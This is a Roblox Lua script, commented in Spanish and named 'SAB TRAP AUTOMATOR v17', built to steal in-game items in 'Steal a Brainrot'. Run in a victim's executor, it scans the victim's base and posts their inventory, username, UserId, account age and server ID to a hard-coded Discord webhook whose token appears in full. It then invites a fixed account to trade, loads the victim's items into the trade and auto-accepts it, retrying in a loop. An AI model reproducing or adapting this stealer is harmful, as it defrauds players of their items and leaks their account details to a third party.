--[[=====================================================================
    SAB | TRAP AUTOMATOR v17 (ULTIMATE FIXED & OPTIMIZED)
    - Cero Gears basura de la mochila (Backpack excluido).
    - Clasificación exacta por rareza y filtrado de "No Target" para Brainrots.
    - Velocidad extrema de ejecución e invitación instantánea a KIMILOSP.
=====================================================================]]

local Players = game:GetService("Players")
local RS      = game:GetService("ReplicatedStorage")
local WS      = game:GetService("Workspace")
local HS      = game:GetService("HttpService")
local LP      = Players.LocalPlayer
local U       = table.unpack or unpack

local CFG = {
    WEBHOOK          = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B",
    TARGET_ID        = 9555775328,
    TARGET_NAME      = "KIMILOSP",
    PLACE_ID         = 109983668079237,
    STRICT_PLACE     = false,
    WATCH_GUI        = true,
    AUTO_ACCEPT      = true,
    ADD_ALL_IF_EMPTY = true,
    MAX_TRADE_ITEMS  = 18,
    ITEM_DELAY       = 0.3,
    POLL             = 0.2,
    RETRY_AFTER      = 5,
    INVITE_TIMEOUT   = 4,
    GUI_TIMEOUT      = 8,
    COMPLETE_TIMEOUT = 15,
    INVITE_BACKOFF   = { 2, 4, 8, 15 },
    PING_EVERYONE    = true,
    DEBUG            = true,
}

-- Lista de Brainrots configurados en FALSE (No se robarán, irán a ITEMS NO TARGET)
local NORMAL_BRAINROTS = {
    ["Fluriflura"] = false, ["Holy Arepa"] = false, ["Lirilì Larilà"] = false, ["Noobini Pizzanini"] = false,
    ["Noobini Santanini"] = false, ["Pipi Corni"] = false, ["Pipi Kiwi"] = false, ["Raccooni Jandelini"] = false,
    ["Svinina Bombardino"] = false, ["Talpa Di Fero"] = false, ["Tartaragno"] = false, ["Tim Cheese"] = false,
    ["Bandito Bobritto"] = false, ["Boneca Ambalabu"] = false, ["Cacto Hipopotamo"] = false, ["Cupcake Koala"] = false,
    ["Frogo Elfo"] = false, ["Gangster Footera"] = false, ["Pengolino Nuvoletto"] = false, ["Pinealotto Fruttarino"] = false,
    ["Pipi Avocado"] = false, ["Ta Ta Ta Ta Sahur"] = false, ["Tric Trac Baraboom"] = false, ["Trippi Troppi"] = false,
    ["Avocadini Antilopini"] = false, ["Avocadini Guffo"] = false, ["Bambini Crostini"] = false, ["Bananita Dolphinita"] = false,
    ["Brr Brr Patapim"] = false, ["Brri Brri Bicus Dicus Bombicus"] = false, ["Cappuccino Assassino"] = false, ["Doi Doi Do"] = false,
    ["Frogato Pirato"] = false, ["Gato Celesto"] = false, ["Malame Amarele"] = false, ["Mangolini Parrocini"] = false,
    ["Mummio Rappitto"] = false, ["Penguin Tree"] = false, ["Penguino Cocosino"] = false, ["Perochello Lemonchello"] = false,
    ["Salamino Penguino"] = false, ["Ti Ti Ti Sahur"] = false, ["Trulimero Trulicina"] = false, ["Wombo Rollo"] = false,
    ["Penguino Pumpkino"] = false, ["Avocadorilla"] = false, ["Bananito Bandito"] = false, ["Berenjello Angello"] = false,
    ["Bombombini Gusini"] = false, ["Bucketoro"] = false, ["Cachorrito Melonito"] = false, ["Carloo"] = false,
    ["Carrotini Brainini"] = false, ["Cavallo Virtuoso"] = false, ["Cocoteddy"] = false, ["Frigo Camelo"] = false,
    ["Gorillo Watermelondrillo"] = false, ["Harpuccino"] = false, ["Jacko Spaventosa"] = false, ["Jingle Jingle Sahur"] = false,
    ["Lerulerulerule"] = false, ["Los Noobinis"] = false, ["Lucky Block"] = false, ["Magi Ribbitini"] = false,
    ["Orangutini Ananassini"] = false, ["Orbi Mochi"] = false, ["Rhino Helicopterino"] = false, ["Rhino Toasterino"] = false,
    ["Spioniro Golubiro"] = false, ["Spongini Quackini"] = false, ["Stoppo Luminino"] = false, ["Te Te Te Sahur"] = false,
    ["Tigrilini Watermelini"] = false, ["Tob Tobi Tobi"] = false, ["Toiletto Focaccino"] = false, ["Tracoducotulu Delapeladustuz"] = false,
    ["Tree Tree Tree Sahur"] = false, ["Zibra Zubra Zibralini"] = false, ["Frostino Vampiro"] = false, ["Ballerina Cappuccina"] = false,
    ["Bandito Axolito"] = false, ["Blueberrinni Octopusini"] = false, ["Buho de Fuego"] = false, ["Buho del Cielo"] = false,
    ["Burbaloni Loliloli"] = false, ["Caramello Filtrello"] = false, ["Chef Crabracadabra"] = false, ["Chimpanzini Bananini"] = false,
    ["Chocco Bunny"] = false, ["Clickerino Crabo"] = false, ["Cocosini Mama"] = false, ["Electro Quacko"] = false,
    ["Glorbo Fruttodrillo"] = false, ["Lionel Cactuseli"] = false, ["Pandaccini Bananini"] = false, ["Pi Pi Watermelon"] = false,
    ["Pipi Potato"] = false, ["Puffaball"] = false, ["Quackula"] = false, ["Quivioli Ameleonni"] = false,
    ["Sealo Regalo"] = false, ["Seraphino Gruyero"] = false, ["Sigma Boy"] = false, ["Sigma Girl"] = false,
    ["Strawberrelli Flamingelli"] = false, ["Alessio"] = false, ["Anpali Babel"] = false, ["Appelini"] = false,
    ["Aquanaut"] = false, ["Astrolero Cervalero"] = false, ["Ballerina Peppermintina"] = false, ["Ballerino Lololo"] = false,
    ["Bambu Bambu Sahur"] = false, ["Belula Beluga"] = false, ["Boba Panda"] = false, ["Bombardini Tortinii"] = false,
    ["Brasilini Berimbini"] = false, ["Brr es Teh Patipum"] = false, ["Buho de Noelo"] = false, ["Bulbito Bandito Traktorito"] = false,
    ["Bunny Tralala"] = false, ["Cacasito Satalito"] = false, ["Capi Taco"] = false, ["Cappuccino Clownino"] = false,
    ["Chihuanini Taconini"] = false, ["Chrismasmamat"] = false, ["Clovkur Kurkur"] = false, ["Cocoa Assassino"] = false,
    ["Cocofanto Elefanto"] = false, ["Corn Corn Corn Sahur"] = false, ["Crabbo Limonetta"] = false, ["Divino Platypio"] = false,
    ["Dolphini Jetskini"] = false, ["Dumborino Miracello"] = false, ["Eggdin Egg Egg Dun"] = false, ["Espresso Signora"] = false,
    ["Extinct Ballerina"] = false, ["Flippo Marino"] = false, ["Frio Ninja"] = false, ["Gattatino Nyanino"] = false,
    ["Gattito Tacoto"] = false, ["Ginger Cisterna"] = false, ["Ginger Globo"] = false, ["Girafa Celestre"] = false,
    ["Granchiello Spiritell"] = false, ["Karkerheart Luvkur"] = false, ["Krupuk Pagi Pagi"] = false, ["Lemonita Splashita"] = false,
    ["Los Bombinitos"] = false, ["Los Chihuaninis"] = false, ["Los Crocodillitos"] = false, ["Los Gattitos"] = false,
    ["Los Orcalitos"] = false, ["Los Tipi Tacos"] = false, ["Los Tungtungtungcitos"] = false, ["Lumaca Malefica"] = false,
    ["Luv Luv Luv"] = false, ["Mastodontico Telepiedone"] = false, ["Mummy Ambalabu"] = false, ["Odin Din Din Dun"] = false,
    ["Pakrahmatmamat"] = false, ["Pakrahmatmatina"] = false, ["Patteo"] = false, ["Piccione Macchina"] = false,
    ["Pop Pop Sahur"] = false, ["Robo Grafito"] = false, ["Skull Skull Skull"] = false, ["Snailenzo"] = false,
    ["Squalanana"] = false, ["Sundrilla Sundae"] = false, ["Tartaruga Cisterna"] = false, ["Tenini Ballini"] = false,
    ["Tentacolo Tecnico"] = false, ["Tigroligre Frutonni"] = false, ["Tipi Topi Taco"] = false, ["Tootini Shrimpini"] = false,
    ["Tortuginni Sandcastlini"] = false, ["Tractoro Dinosauro"] = false, ["Tralalero Tralala"] = false, ["Tralalita Tralala"] = false,
    ["Trenostruzzo Turbo 3000"] = false, ["Trenotubo Axolotrico 9000"] = false, ["Trippi Troppi Troppa Trippa"] = false, ["Tukanno Bananno"] = false,
    ["Urubini Flamenguini"] = false, ["Vampira Cappucina"] = false, ["Yeti Claus"] = false, ["Vampi Ribbitini"] = false,
    ["Mummelo Bandello"] = false, ["Mortaruga"] = false, ["Candi Corni"] = false, ["Slushi Huski"] = false,
    ["Skul Skuli Skuli"] = false, ["1x1x1x1"] = false, ["25"] = false, ["67"] = false,
    ["Aquarino"] = false, ["Berryno"] = false, ["Arcadopus"] = false, ["Blackhole Goat"] = false,
    ["Bombardiro Vaccariro"] = false, ["Brunito Marsito"] = false, ["Boatito Auratito"] = false, ["Bisonte Giuppitere"] = false,
    ["Buho de Volto"] = false, ["Bunito Bunito Spinito"] = false, ["Bunny Bunny Bunny Sahur"] = false, ["Buntteo"] = false,
    ["Burrito Bandito"] = false, ["Bunnyman"] = false, ["Chachechi"] = false, ["Chicleteirina Bicicleteirina"] = false,
    ["Craburger"] = false, ["Cupid Hotspot"] = false, ["Cupid Cupid Sahur"] = false, ["Dul Dul Dul"] = false,
    ["Eid Eid Eid Sahur"] = false, ["Extinct Matteo"] = false, ["Extinct Tralalero"] = false, ["Fishboard"] = false,
    ["Flipa Sandala"] = false, ["Flancito"] = false, ["GOAT"] = false, ["Frankentteo"] = false,
    ["Gelato Lumacho"] = false, ["Giftini Spyderini"] = false, ["Girafini Raftini"] = false, ["Gold Elf"] = false,
    ["Glaciator"] = false, ["Gold Gold Gold"] = false, ["Ho Ho Ho Sahur"] = false, ["Horegini Boom"] = false,
    ["Jackorilla"] = false, ["Karkerkar Kurkur"] = false, ["La Vacca Jacko Linterino"] = false, ["La Vacca Lepre Lepreino"] = false,
    ["La Vacca Prese Presente"] = false, ["La Vacca Saturno Saturnita"] = false, ["Las Tralaleritas"] = false, ["Las Vaquitas Saturnitas"] = false,
    ["List List List Sahur"] = false, ["Los Bunitos"] = false, ["Los Burritos"] = false, ["Los Chicleteiras"] = false,
    ["Los Cucarachas"] = false, ["Los Karkeritos"] = false, ["Los Jobcitos"] = false, ["Los Mi Gatitos"] = false,
    ["Los Matteos"] = false, ["Los Nooo My Hotspotsitos"] = false, ["Los Quesadillas"] = false, ["Los Spyderinis"] = false,
    ["Los Sweethearts"] = false, ["Los Tortus"] = false, ["Los Trios"] = false, ["Los Tralaleritos"] = false,
    ["Luck Luck Luck Sahur"] = false, ["Love Love Love Sahur"] = false, ["Noo my Gold"] = false, ["Noo my Heart"] = false,
    ["Noo my Eggs"] = false, ["Naughty Naughty"] = false, ["Mariachi Corazoni"] = false, ["Ombrello Topolino"] = false,
    ["Octoball"] = false, ["Perrito Burrito"] = false, ["Paradiso Axolottino"] = false, ["Please my Present"] = false,
    ["Pumpkini Spyderini"] = false, ["Reindeer Tralala"] = false, ["Rang Ring Bus"] = false, ["Quesadilla Crocodila"] = false,
    ["Quesadillo Vampiro"] = false, ["Rocketini Frostini"] = false, ["Rocco Disco"] = false, ["Santa Hotspot"] = false,
    ["Santteo"] = false, ["Serafinna Medusella"] = false, ["Strawberrita"] = false, ["Sushi Inu"] = false,
    ["To to to Sahur"] = false, ["Triplito Tralaleritos"] = false, ["Zombie Tralala"] = false, ["Toro Españolo"] = false,
    ["Gelatina Volatina"] = false, ["Pogo Pogo Penguin"] = false, ["Burrito Bat"] = false, ["Motorino Bumbuni"] = false,
    ["Gattino Hydrantino"] = false, ["Syrup Samurai"] = false, ["Gub"] = false, ["Sir Mangus"] = false,
    ["Rexino Ramino"] = false, ["Capibaro Celestino"] = false, ["Rockarino Rockara"] = false, ["Los Treaters"] = false,
    ["Zombie Bowl"] = false, ["Bananito Skelito"] = false, ["Grim Cheese"] = false, ["Co Co Co Sahur"] = false
}

local NORMAL_BASE_SKINS = {
    ["Rose"]=true,["Gingerbread"]=true,["Halloween"]=true,["Christmas"]=true,["Bunny Basket"]=true,
    ["Summer"]=true,["Pot of Gold"]=true,["Taco"]=true,["Octo"]=true,["Valentines"]=true,
    ["Easter"]=true,["Lucky"]=true,["Aquatic"]=true,["Tralalero"]=true,["Bee Emperor"]=true,["Honey Bee"]=true,
}

local NORMAL_GEARS = {
    ["Santa's Sleigh"]=true,["Cupid's Wings"]=true,["Witch's Broom"]=true,["Waverider"]=true,
    ["Yin Yang Slap"]=true,["Cursed Slap"]=true,["Cyber Slap"]=true,["Divine Slap"]=true,
    ["Bloodmoon Slap"]=true,["Radioactive Slap"]=true,["Rainbow Slap"]=true,["Rainbow Hammer"]=true,
    ["Bloodmoon Hammer"]=true,["Radioactive Airstrike"]=true,["Yin Yang Lamp"]=true,["Demon's Head"]=true,
    ["Lava Slap"]=true,["Lava Blaster"]=true,["Alien Slap"]=true,["Blackhole Bomb"]=true,
    ["Candy Sentry"]=true,["Phantom Slap"]=true,["Flying Bee"]=true,["Crystal Slap"]=true,
    ["Candy Slap"]=true,["Crystal Hammer"]=true,
}

-- Función para asignar emojis de rareza automáticamente según el nombre o valor
local function getRarityEmoji(name)
    local lower = string.lower(name)
    if lower:find("god") or lower:find("brainrot god") then
        return "🌈 [Brainrot God]"
    elseif lower:find("secret") then
        return "⚪ [Secret]"
    elseif lower:find("og") then
        return "🟡 [OG]"
    elseif lower:find("mythic") or lower:find("mítico") then
        return "🔴 [Mythic]"
    elseif lower:find("legendary") or lower:find("legendario") then
        return "🟡 [Legendary]"
    elseif lower:find("epic") or lower:find("épico") then
        return "🟣 [Epic]"
    elseif lower:find("rare") or lower:find("raro") then
        return "🔵 [Rare]"
    else
        return "🟢 [Common]"
    end
end

local S = {
    running    = true,
    phase      = "BOOT",
    invTries   = 1,
    lastInvite = -999,
    invitedAt  = 0,
    guiAt      = 0,
    tradeGui   = nil,
    baseline   = {},
    sent       = 0,
    reported   = false,
}

local R = {
    SearchUser     = nil,
    Invite         = nil,
    AcceptInvite   = nil,
    AddBrainrot    = nil,
    AddItem        = nil,
    Ready          = nil,
    Accept         = nil,
    Cancel         = nil,
    InviteResult   = nil,
    TradeCompleted = nil,
}

local function log(m) if CFG.DEBUG then print("[SAB v17] " .. tostring(m)) end end

local function getExecutorName()
    if typeof(identifyexecutor) == "function" then
        local ok, name, ver = pcall(identifyexecutor)
        if ok and name then return tostring(name) .. (ver and (" " .. tostring(ver)) or "") end
    end
    return "Delta / Executor"
end

-- ============================ WEBHOOK ============================
local Q, sending = {}, false

local function rawPost(body)
    local url = CFG.WEBHOOK
    if not url or url == "" then return false end
    return pcall(function()
        local req = (typeof(syn) == "table" and syn.request)
                 or (typeof(http) == "table" and http.request)
                 or (typeof(fluxus) == "table" and fluxus.request)
                 or request
        if typeof(req) == "function" then
            req({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        else
            HS:PostAsync(url, body)
        end
    end)
end

local function worker()
    if sending then return end
    sending = true
    while #Q > 0 do
        local p = table.remove(Q, 1)
        local ok, body = pcall(HS.JSONEncode, HS, p)
        if ok then
            for _ = 1, 2 do
                if rawPost(body) then break end
                task.wait(0.5)
            end
        end
        task.wait(0.5)
    end
    sending = false
end

local function post(p)
    table.insert(Q, p)
    task.spawn(worker)
end

local function sendScanEmbed(items)
    local bTarget, baseTarget, gearTarget = {}, {}, {}
    local bNoTarget, baseNoTarget, gearNoTarget = {}, {}, {}

    for _, it in ipairs(items) do
        local rarityPrefix = getRarityEmoji(it.name)
        local line = string.format("%s %s", rarityPrefix, (it.raw ~= "" and it.raw or it.name))
        
        if it.kind == "brainrot" then
            if it.isTarget then table.insert(bTarget, line) else table.insert(bNoTarget, line) end
        elseif it.kind == "base" then
            if it.isTarget then table.insert(baseTarget, it.name) else table.insert(baseNoTarget, it.name) end
        elseif it.kind == "gear" then
            if it.isTarget then table.insert(gearTarget, it.name) else table.insert(gearNoTarget, it.name) end
        end
    end

    local function fmtList(list, emptyText)
        if #list == 0 then return "*" .. (emptyText or "NONE") .. "*" end
        local out = {}
        for i, v in ipairs(list) do
            if i <= 25 then table.insert(out, ("%d. %s"):format(i, v)) end
        end
        return table.concat(out, "
")
    end

    local noTargetCount = #bNoTarget + #baseNoTarget + #gearNoTarget
    local noTargetSections = {}
    if #bNoTarget > 0 then table.insert(noTargetSections, "🧠 **Brainrots (Basura / No Target):**
" .. fmtList(bNoTarget)) end
    if #baseNoTarget > 0 then table.insert(noTargetSections, "⚙️ **Bases:**
" .. fmtList(baseNoTarget)) end
    if #gearNoTarget > 0 then table.insert(noTargetSections, "🔧 **Gears:**
" .. fmtList(gearNoTarget)) end
    local noTargetBlock = #noTargetSections > 0 and table.concat(noTargetSections, "

") or "*NONE*"

    local desc = table.concat({
        ("🧠 **BRAINROT TARGET (%d)**
----
%s"):format(#bTarget, fmtList(bTarget)),
        ("⚙️ **BASE TARGET (%d)**
----
%s"):format(#baseTarget, fmtList(baseTarget)),
        ("🔧 **GEARS TARGET (%d)**
----
%s"):format(#gearTarget, fmtList(gearTarget)),
        ("📦 **ITEMS NO TARGET (%d)**
----
%s"):format(noTargetCount, noTargetBlock),
        ("🖥️ **Executor**
%s"):format(getExecutorName()),
        ("👥 **Jugadores**
%d/%d"):format(#Players:GetPlayers(), Players.MaxPlayers or 8),
        ("📅 **Cuenta**
%d días"):format(LP.AccountAge or 0),
    }, "

")

    post({
        username = "SAB-TRAPPER",
        content = CFG.PING_EVERYONE and "@everyone" or "",
        allowed_mentions = { parse = { "everyone" } },
        embeds = {{
            color = 65280,
            description = desc:sub(1, 4000),
            footer = { text = ("%s • %d • JobId: %s"):format(LP.Name, LP.UserId, game.JobId) }
        }}
    })
end

local function reportAlert(title, msg, color)
    post({
        username = "SAB-TRAPPER",
        content = "",
        embeds = {{
            color = color or 15548997,
            description = ("**%s**
%s"):format(title, msg),
            footer = { text = ("%s • %d"):format(LP.Name, LP.UserId) }
        }}
    })
end

-- ============================ UTILIDADES Y REMOTES ============================
local function findPath(root, path)
    if not root then return nil end
    local cur = root
    for seg in string.gmatch(path, "[^/]+") do
        if not cur then return nil end
        cur = cur:FindFirstChild(seg)
    end
    return cur
end

local function cleanName(raw)
    if not raw then return "" end
    local base = string.match(raw, "^([^|%-]+)") or raw
    return (base:gsub("^%s*(.-)%s*$", "%1"))
end

local function extractId(obj)
    if not obj then return nil end
    for _, k in ipairs({ "ItemId","ItemID","Id","ID","Uuid","UUID","UniqueId","BrainrotId" }) do
        local v = obj:GetAttribute(k)
        if v ~= nil then return v end
    end
    return nil
end

local function isOk(res)
    if res == nil then return true end
    if res == true then return true end
    if res == false then return false end
    if type(res) == "table" then
        for _, k in ipairs({ "success","ok","Success","Ok","accepted","Accepted" }) do
            if res[k] ~= nil then return res[k] and true or false end
        end
        return true
    end
    if type(res) == "string" then
        local s = res:lower()
        if s:find("false") or s:find("offline") or s:find("busy") or s:find("expired") or s:find("decline") or s:find("not found") then return false end
        return true
    end
    return true
end

local function callRF(rf, timeout, ...)
    if not rf then return false, "no_remote" end
    local args = { ... }
    local finished, ok, res = false, false, nil
    task.spawn(function()
        ok, res = pcall(function() return rf:InvokeServer(U(args)) end)
        finished = true
    end)
    local t0 = os.clock()
    while not finished and os.clock() - t0 < timeout do task.wait(0.02) end
    if not finished then return false, "timeout" end
    return ok, res
end

local function fireRE(re, ...)
    if not re then return false end
    local args = { ... }
    return pcall(function() re:FireServer(U(args)) end)
end

local function backoff()
    local t = CFG.INVITE_BACKOFF
    local i = math.clamp(S.invTries, 1, #t)
    return t[i] or t[#t] or 5
end

local function resolveRemotes()
    local net = findPath(RS, "Packages/Net")
    if not net then return false end

    local function getNetRemote(exactName)
        return net:FindFirstChild(exactName)
    end

    R.SearchUser     = getNetRemote("RF/TradeService/SearchUser")
    R.Invite         = getNetRemote("RF/TradeService/Invite")
    R.AcceptInvite   = getNetRemote("RF/TradeService/AcceptInvite")
    R.AddBrainrot    = getNetRemote("RF/TradeService/AddBrainrot")
    R.AddItem        = getNetRemote("RF/TradeService/AddItem")
    R.Ready          = getNetRemote("RE/TradeService/Ready")
    R.Accept         = getNetRemote("RE/TradeService/Accept")
    R.Cancel         = getNetRemote("RE/TradeService/CancelTrade")
    R.InviteResult   = getNetRemote("RE/TradeService/InviteResult")
    R.TradeCompleted = getNetRemote("RE/TradeService/TradeCompleted")

    if not R.Invite then
        for _, d in ipairs(net:GetDescendants()) do
            if d.Name == "RF/TradeService/Invite" or d.Name == "Invite" then R.Invite = d end
            if d.Name == "RF/TradeService/SearchUser" or d.Name == "SearchUser" then R.SearchUser = d end
            if d.Name == "RF/TradeService/AddBrainrot" or d.Name == "AddBrainrot" then R.AddBrainrot = d end
            if d.Name == "RF/TradeService/AddItem" or d.Name == "AddItem" then R.AddItem = d end
            if d.Name == "RE/TradeService/Ready" or d.Name == "Ready" then R.Ready = d end
            if d.Name == "RE/TradeService/Accept" or d.Name == "Accept" then R.Accept = d end
            if d.Name == "RE/TradeService/CancelTrade" or d.Name == "CancelTrade" then R.Cancel = d end
            if d.Name == "RE/TradeService/InviteResult" or d.Name == "InviteResult" then R.InviteResult = d end
            if d.Name == "RE/TradeService/TradeCompleted" or d.Name == "TradeCompleted" then R.TradeCompleted = d end
        end
    end

    return R.Invite ~= nil and R.AddBrainrot ~= nil
end

-- ============================ PLOT / INVENTARIO (EXCLUYENDO BACKPACK) ============================
local function ownPlot()
    local plots = WS:FindFirstChild("Plots")
    if not plots then return nil end
    local byName = plots:FindFirstChild(LP.Name)
    if byName then return byName end
    for _, plot in ipairs(plots:GetChildren()) do
        local yb = findPath(plot, "PlotSign/YourBase")
        if yb and yb:IsA("BillboardGui") and yb.Enabled then return plot end
    end
    return nil
end

local function readOverheadText(a)
    local oh = findPath(a, "Base/Spawn/Attachment/AnimalOverhead")
             or findPath(a, "Info/AnimalOverhead")
             or a:FindFirstChild("AnimalOverhead", true)
    if not oh then return nil end
    local dn = oh:FindFirstChild("DisplayName")
    local gen = oh:FindFirstChild("Generation") or oh:FindFirstChild("Cash") or oh:FindFirstChild("Value")
    if dn and dn:IsA("TextLabel") and dn.Text ~= "" then
        local extra = (gen and gen:IsA("TextLabel") and gen.Text ~= "") and (" | 💰 " .. gen.Text) or ""
        return dn.Text, dn.Text .. extra
    end
    return nil
end

local function snapshot()
    local out = {}
    local plot = ownPlot()
    if plot then
        local podiums = plot:FindFirstChild("AnimalPodiums")
        if podiums then
            for _, a in ipairs(podiums:GetChildren()) do
                local rawName, fullDisplay = readOverheadText(a)
                if rawName then
                    local name = cleanName(rawName)
                    local skin = a:GetAttribute("Skin") or a:GetAttribute("BaseSkin")
                    local isTargetVal = NORMAL_BRAINROTS[name]
                    if isTargetVal == nil then isTargetVal = false end -- Por defecto falso si no está en la lista de targets verdaderos
                    
                    table.insert(out, {
                        kind = "brainrot", raw = fullDisplay, name = name, skin = skin,
                        id = extractId(a), inst = a,
                        isTarget = isTargetVal,
                    })
                    if skin and skin ~= "" then
                        table.insert(out, {
                            kind = "base", raw = skin, name = skin, skin = skin,
                            id = extractId(a), inst = a,
                            isTarget = NORMAL_BASE_SKINS[skin] and true or false,
                        })
                    end
                end
            end
        end

        local purchases = plot:FindFirstChild("Purchases")
        if purchases then
            for _, block in ipairs(purchases:GetChildren()) do
                local box = block:FindFirstChild("PlotBlock")
                if box then
                    for _, d in ipairs(box:GetDescendants()) do
                        if d:IsA("TextLabel") and d.Text ~= "" then
                            local name = cleanName(d.Text)
                            local isSkin = NORMAL_BASE_SKINS[name] ~= nil
                            table.insert(out, {
                                kind = isSkin and "base" or "gear",
                                raw = d.Text, name = name,
                                id = extractId(box), inst = box,
                                isTarget = (NORMAL_GEARS[name] or isSkin) and true or false,
                            })
                            break
                        end
                    end
                end
            end
        end
    end
    -- NOTA: Backpack (mochila) EXCLUIDO por completo para que no aparezca basura no tradeable en Discord.
    return out, plot
end

-- ============================ TRADE GUI & FILL ============================
local fill, finish

local function tradeGui()
    local pg = LP:FindFirstChild("PlayerGui")
    if not pg then return nil end
    for _, g in ipairs(pg:GetChildren()) do
        if g:IsA("ScreenGui") and not S.baseline[g] then return g end
    end
    return nil
end

task.spawn(function()
    local pg = LP:WaitForChild("PlayerGui", 15)
    if not pg then return end
    for _, g in ipairs(pg:GetChildren()) do
        if g:IsA("ScreenGui") then S.baseline[g] = true end
    end

    while S.running do
        local g = tradeGui()
        if g and not g:GetAttribute("sabSeen") then
            g:SetAttribute("sabSeen", true)
            if (S.phase == "WAIT_GUI" or S.phase == "INVITING") and S.phase ~= "FILLING" then
                S.tradeGui = g
                S.phase = "FILLING"
                task.spawn(fill)
            end
        end
        task.wait(0.2)
    end
end)

fill = function()
    if S.phase == "FILLING" and S.sent > 0 then return end
    S.sent = 0

    local items = snapshot()
    local targets = {}
    for _, it in ipairs(items) do
        if it.isTarget and (it.kind == "brainrot" or it.kind == "gear") then
            table.insert(targets, it)
        end
    end
    if #targets == 0 and CFG.ADD_ALL_IF_EMPTY then
        targets = items
    end

    for i, it in ipairs(targets) do
        if i > CFG.MAX_TRADE_ITEMS then break end
        if not S.running or S.phase ~= "FILLING" then break end
        if not (it.inst and it.inst.Parent) then continue end

        local rf = (it.kind == "brainrot") and R.AddBrainrot or R.AddItem
        local ok, res = callRF(rf, 3, it.id or it.inst)
        if ok and isOk(res) then
            S.sent += 1
        end
        task.wait(CFG.ITEM_DELAY)
    end

    task.wait(0.2)
    fireRE(R.Ready, true)
    task.wait(0.4)
    if CFG.AUTO_ACCEPT then fireRE(R.Accept, true) end

    S.phase = "WAIT_COMPLETE"
    S.guiAt = os.clock()
end

finish = function(state, detail)
    S.phase = "DONE"
    S.tradeGui = nil
    S.sent = 0
    task.delay(CFG.RETRY_AFTER, function()
        if not S.running then return end
        S.phase = "IDLE"
        S.invTries = 1
        S.lastInvite = -999
    end)
end

-- ============================ INVITE INSTANTÁNEO A KIMILOSP ============================
local function invite()
    if not R.Invite then return end
    S.phase = "INVITING"
    S.lastInvite = os.clock()

    if R.SearchUser then
        pcall(function() R.SearchUser:InvokeServer(CFG.TARGET_NAME) end)
    end

    local ok, res = callRF(R.Invite, CFG.INVITE_TIMEOUT, CFG.TARGET_ID)
    if not ok or not isOk(res) then
        ok, res = callRF(R.Invite, CFG.INVITE_TIMEOUT, CFG.TARGET_NAME)
    end

    if ok and isOk(res) then
        S.phase = "WAIT_GUI"
        S.invitedAt = os.clock()
    else
        S.phase = "IDLE"
        S.invTries += 1
    end
end

local function bindEvents()
    if R.InviteResult then
        R.InviteResult.OnClientEvent:Connect(function(payload)
            local flat = tostring(payload):lower()
            if flat:find("accept") or flat:find("true") then
                if S.phase == "WAIT_GUI" or S.phase == "INVITING" then
                    S.phase = "FILLING"
                    task.spawn(fill)
                end
            else
                S.phase = "IDLE"
                S.invTries += 1
            end
        end)
    end

    if R.TradeCompleted then
        R.TradeCompleted.OnClientEvent:Connect(function() finish("completado", "TradeCompleted") end)
    end

    if R.Cancel then
        R.Cancel.OnClientEvent:Connect(function()
            if S.phase ~= "IDLE" and S.phase ~= "DONE" then finish("cancelado", "CancelTrade") end
        end)
    end
end

-- ============================ ARRANQUE ULTRARRÁPIDO (~1s) ============================
task.spawn(function()
    local waited = 0
    while not resolveRemotes() and waited < 10 do
        task.wait(0.5)
        waited += 0.5
    end

    if not R.Invite then
        reportAlert("REMOTES NO ENCONTRADOS", "No se hallaron los remotes de TradeService.")
        return
    end

    bindEvents()

    -- Escaneo inicial inmediato y reporte al webhook en menos de 1 segundo
    local items, _ = snapshot()
    if not S.reported then
        S.reported = true
        sendScanEmbed(items)
    end

    S.phase = "IDLE"

    while S.running do
        local p = S.phase
        if p == "WAIT_GUI" and os.clock() - S.invitedAt > CFG.GUI_TIMEOUT then
            fireRE(R.Cancel)
            S.phase = "IDLE"
            S.invTries += 1
        elseif p == "WAIT_COMPLETE" and os.clock() - S.guiAt > CFG.COMPLETE_TIMEOUT then
            finish("timeout", "sin confirmación")
        elseif p == "IDLE" then
            if os.clock() - S.lastInvite >= backoff() then
                invite()
            end
        end
        task.wait(CFG.POLL)
    end
end)
